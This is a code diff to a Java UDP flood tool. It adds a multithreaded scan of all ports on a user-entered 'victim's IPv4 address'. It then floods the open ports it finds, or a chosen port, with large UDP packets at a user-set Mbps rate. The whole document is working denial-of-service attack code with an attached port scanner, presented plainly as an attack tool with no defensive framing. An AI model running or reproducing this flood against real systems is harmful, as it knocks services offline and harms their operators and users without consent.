@@ -4,16 +4,37 @@ import utils.LoggingUtils;
 import utils.ProgressBarUtils;
 
 import java.io.IOException;
-import java.net.DatagramPacket;
-import java.net.DatagramSocket;
-import java.net.InetAddress;
+import java.net.*;
+import java.util.ArrayList;
+import java.util.List;
 import java.util.Random;
+import java.util.concurrent.CompletableFuture;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
 
 public class UDPFlood extends LoggingUtils {
 
     public UDPFlood() throws IOException {
         final InetAddress address = InetAddress.getByName(getUserInput("Enter victim's IPv4 address: "));
+
+        final Integer port = Integer.parseInt(getUserInput("Enter specific port to attack ('0' will result in automatic port scan): "));
+
+        List<Integer> dynamicPorts = new ArrayList<>();
+
+        if (port == 0) {
+
+            log("scanning open ports on victim...");
+
+            dynamicPorts = checkAllPorts(address.getHostAddress(), false);
+
+            log("open ports: " + dynamicPorts);
+
+            if (dynamicPorts == null || dynamicPorts.isEmpty()) {
+                dynamicPorts = new ArrayList<>();
+                dynamicPorts.add(1);
+            }
+        }
 
         log("building 500kB byte array...");
 
@@ -23,13 +44,6 @@ public class UDPFlood extends LoggingUtils {
         log("creating socket...");
 
         final DatagramSocket socket = new DatagramSocket();
-
-        log("building packet...");
-
-        final DatagramPacket packet
-                = new DatagramPacket(b, b.length, address, 1);
-
-        log("packet successfully built for port 1!");
 
         final int mbpsCount = Integer.parseInt(getUserInput("Enter attack size (in Mbps): "));
 
@@ -45,7 +59,11 @@ public class UDPFlood extends LoggingUtils {
 
         for (int i = 0; i < (mbpsCount * 2); i++) {
 
+
             ProgressBarUtils.printProgress(startTime, (mbpsCount * 2L), i);
+
+            final DatagramPacket packet
+                    = new DatagramPacket(b, b.length, address, !dynamicPorts.isEmpty() ? getRandomElement(dynamicPorts) : port);
 
             socket.send(packet);
         }
@@ -59,4 +77,40 @@ public class UDPFlood extends LoggingUtils {
         ) + " (" + (System.currentTimeMillis() - startTime) + " ms)");
     }
 
+    public static ArrayList<Integer> checkAllPorts(final String ipv4, final boolean reverse) {
+
+        // Here reverse tells if we should return open ports (false) or closed ports (true).
+
+        final ExecutorService executorService = Executors.newFixedThreadPool(65535);
+        final ArrayList<CompletableFuture<Void>> futures = new ArrayList<>();
+
+        // List of open ports we will return at the end
+        final ArrayList<Integer> returnPorts = new ArrayList<>();
+
+        for (int i = 0; i <= 65535; i++) {
+
+            int finalI = i;
+
+            final CompletableFuture<Void> future = CompletableFuture.runAsync(() -> {
+
+                try {
+                    new Socket().connect(new InetSocketAddress(ipv4, finalI), 1000);
+                    if (!reverse) returnPorts.add(finalI);
+                } catch (final IOException ignored) {
+                    if (reverse) returnPorts.add(finalI);
+                }
+            }, executorService);
+            futures.add(future);
+        }
+        CompletableFuture.allOf(futures.toArray(new CompletableFuture[0])).join();
+        executorService.shutdownNow();
+
+        if (returnPorts.isEmpty()) return null;
+
+        return returnPorts;
+    }
+
+    public Integer getRandomElement(final List<Integer> list) {
+        return list.get(new Random().nextInt(list.size()));
+    }
 }
